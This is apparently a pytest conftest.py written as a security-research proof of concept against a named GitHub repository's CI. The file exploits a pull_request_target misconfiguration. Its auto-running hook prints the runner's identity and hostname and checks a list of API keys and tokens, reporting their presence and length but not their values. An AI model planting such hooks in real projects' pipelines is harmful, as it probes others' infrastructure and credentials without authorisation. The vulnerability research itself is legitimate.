# SECURITY RESEARCH — Non-destructive PoC for FINDING-SC-0XX (PriorLabs/tabpfn-time-series)
# This file prints presence of secrets in the CI environment. No values exfiltrated.
# Will be removed after evidence capture. PR will be closed without merge.

import os


def pytest_configure(config):
    import socket
    import subprocess

    print("\n" + "=" * 60)
    print("[POC] FINDING-SC-0XX — PriorLabs/tabpfn-time-series security probe")
    print("[POC] pull_request_target + fork checkout + zero gate = secrets accessible")
    print("=" * 60)

    try:
        whoami = subprocess.check_output(["whoami"], text=True).strip()
    except Exception:
        whoami = "unknown"
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"

    print(f"[POC] whoami:    {whoami}")
    print(f"[POC] hostname:  {hostname}")
    print(f"[POC] runner_os: {os.environ.get('RUNNER_OS', 'unknown')}")
    print(f"[POC] runner_arch: {os.environ.get('RUNNER_ARCH', 'unknown')}")
    print(f"[POC] github_workflow: {os.environ.get('GITHUB_WORKFLOW', 'unknown')}")
    print(f"[POC] github_event_name: {os.environ.get('GITHUB_EVENT_NAME', 'unknown')}")

    secrets_of_interest = [
        "TABPFN_CLIENT_API_KEY",
        "HF_TOKEN",
        "HUGGING_FACE_HUB_TOKEN",
        "HF_HUB_TOKEN",
        "GITHUB_TOKEN",
        "ANTHROPIC_API_KEY",
        "OPENAI_API_KEY",
    ]

    print("\n[POC] env keys of interest (values fully REDACTED):")
    for key in secrets_of_interest:
        val = os.environ.get(key, "")
        if val:
            print(f"  {key:<40} = <REDACTED length={len(val)}>")
        else:
            print(f"  {key:<40} = not set")

    print("\n[POC] PRESENCE of secrets-derived env vars (boolean):")
    for key in ["TABPFN_CLIENT_API_KEY", "HF_TOKEN", "GITHUB_TOKEN"]:
        present = "YES" if os.environ.get(key) else "no"
        print(f"  {key:<40} = {present}")

    print("=" * 60)
    print("[POC] probe complete — no values exfiltrated, no network calls made")
    print("=" * 60 + "\n")
